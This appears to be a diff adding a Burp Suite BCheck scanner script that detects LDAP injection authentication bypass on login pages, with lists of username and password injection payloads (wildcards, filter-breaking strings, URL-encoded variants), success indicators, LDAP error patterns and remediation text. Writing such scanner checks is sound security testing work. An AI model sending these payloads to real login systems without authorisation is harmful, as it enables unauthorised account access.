@@ -1,0 +1,188 @@
+metadata:
+  language: v2-beta
+  name: "LDAP Authentication Bypass"
+  description: "Detects LDAP injection vulnerabilities specifically on login and authentication pages"
+  author: "Custom BCheck"
+  tags: "injection", "ldap", "authentication", "login", "bypass"
+
+define:
+  # LDAP auth bypass payloads for username field
+  username_payloads = [
+    "*",
+    "admin*",
+    "admin)(&)",
+    "admin)(&(password=*))",
+    "*)(&",
+    "*)(uid=*))(|(uid=*",
+    "admin)(|(password=*)",
+    "*()|%26'",
+    ")(cn=*))(|(cn=*",
+    "admin)(!(&(1=0))",
+    "%2A",
+    "*%29%28%7C%28",
+    "admin%29%28%7C%28uid%3D%2A%29%29"
+  ]
+
+  # LDAP auth bypass payloads for password field
+  password_payloads = [
+    "*",
+    "*)(&",
+    "*()|%26'",
+    "invalid_pass)(&(uid=*",
+    "*)(objectClass=*",
+    "any)(&)",
+    "pwd)(!(&(1=0))"
+  ]
+
+  # Indicators of successful login / auth bypass
+  success_indicators = [
+    "dashboard",
+    "Dashboard",
+    "welcome",
+    "Welcome",
+    "logout",
+    "Logout",
+    "log out",
+    "Log Out",
+    "sign out",
+    "Sign Out",
+    "profile",
+    "Profile",
+    "account",
+    "Account",
+    "home",
+    "Home",
+    "admin panel",
+    "Admin Panel",
+    "my account",
+    "My Account",
+    "session",
+    "authenticated",
+    "Authenticated"
+  ]
+
+  # LDAP error patterns
+  ldap_error_patterns = [
+    "LDAPException",
+    "LdapException",
+    "javax.naming.NamingException",
+    "com.sun.jndi.ldap",
+    "LDAP Error",
+    "ldap_bind",
+    "ldap_search",
+    "NamingException",
+    "javax.naming",
+    "Invalid DN",
+    "LDAP Result Code",
+    "org.springframework.ldap"
+  ]
+
+  # Common login parameter names
+  user_params = ["username", "user", "email", "login", "uname", "uid", "user_name", "userid"]
+  pass_params = ["password", "pass", "passwd", "pwd", "secret", "password1", "user_password"]
+
+
+given request then
+
+  # Only run on likely login endpoints
+  if {base.request.url} matches "(login|signin|sign-in|auth|authenticate|logon|log-in|account/login|user/login|session/new)" then
+
+    # -----------------------------------------------
+    # TEST 1: Username field LDAP injection
+    # -----------------------------------------------
+    for each uparam of user_params:
+      for each payload of username_payloads:
+        send request called user_inject:
+          replacing body parameter uparam: payload
+          replacing body parameter "password": "invalid_password_test"
+
+        # Check for auth bypass via redirect or success keywords
+        if {user_inject.response.status_code} is "302" then
+          report issue:
+            severity: high
+            confidence: firm
+            detail: `LDAP Auth Bypass via Username field. Parameter "{uparam}" with payload "{payload}" triggered a redirect (302), indicating possible authentication bypass.`
+            remediation: "Use parameterized LDAP queries or whitelist input validation. Never construct LDAP filters with raw user-supplied values."
+        end if
+
+        if any success_indicators in {user_inject.response.body} then
+          report issue:
+            severity: high
+            confidence: firm
+            detail: `LDAP Auth Bypass via Username field. Parameter "{uparam}" with payload "{payload}" returned a successful authentication response without valid credentials.`
+            remediation: "Sanitize all user inputs. Use safe LDAP libraries that support parameterized queries and enforce strict input validation on authentication fields."
+        end if
+
+        if any ldap_error_patterns in {user_inject.response.body} then
+          report issue:
+            severity: medium
+            confidence: firm
+            detail: `LDAP Injection Error in Username field. Parameter "{uparam}" with payload "{payload}" triggered an LDAP error, confirming the input is passed to an LDAP query.`
+            remediation: "Sanitize and escape special LDAP characters in user input: ( ) * \ NUL"
+        end if
+
+      end for
+    end for
+
+
+    # -----------------------------------------------
+    # TEST 2: Password field LDAP injection
+    # -----------------------------------------------
+    for each pparam of pass_params:
+      for each payload of password_payloads:
+        send request called pass_inject:
+          replacing body parameter "username": "admin"
+          replacing body parameter pparam: payload
+
+        if {pass_inject.response.status_code} is "302" then
+          report issue:
+            severity: high
+            confidence: firm
+            detail: `LDAP Auth Bypass via Password field. Parameter "{pparam}" with payload "{payload}" triggered a redirect (302), indicating possible authentication bypass.`
+            remediation: "Use parameterized LDAP queries. Escape all special characters in password fields before constructing LDAP filters."
+        end if
+
+        if any success_indicators in {pass_inject.response.body} then
+          report issue:
+            severity: high
+            confidence: firm
+            detail: `LDAP Auth Bypass via Password field. Parameter "{pparam}" with payload "{payload}" returned a successful login response without valid credentials.`
+            remediation: "Sanitize and validate password field inputs. Use secure LDAP binding methods and avoid dynamic LDAP filter construction."
+        end if
+
+        if any ldap_error_patterns in {pass_inject.response.body} then
+          report issue:
+            severity: medium
+            confidence: firm
+            detail: `LDAP Injection Error in Password field. Parameter "{pparam}" with payload "{payload}" triggered an LDAP error response.`
+            remediation: "Sanitize and escape special LDAP characters in all authentication fields."
+        end if
+
+      end for
+    end for
+
+
+    # -----------------------------------------------
+    # TEST 3: Both fields injected simultaneously
+    # -----------------------------------------------
+    send request called both_inject:
+      replacing body parameter "username": "*"
+      replacing body parameter "password": "*"
+
+    if {both_inject.response.status_code} is "302" then
+      report issue:
+        severity: high
+        confidence: firm
+        detail: "LDAP Auth Bypass: Injecting wildcard (*) in both username and password fields triggered a redirect, indicating authentication bypass."
+        remediation: "Validate and sanitize both username and password fields. Reject inputs containing LDAP special characters: ( ) * \\ NUL"
+    end if
+
+    if any success_indicators in {both_inject.response.body} then
+      report issue:
+        severity: high
+        confidence: firm
+        detail: "LDAP Auth Bypass: Wildcard (*) in both username and password returned a successful login response without valid credentials."
+        remediation: "Implement strict input validation. Use safe LDAP authentication libraries and parameterized queries."
+    end if
+
+  end if
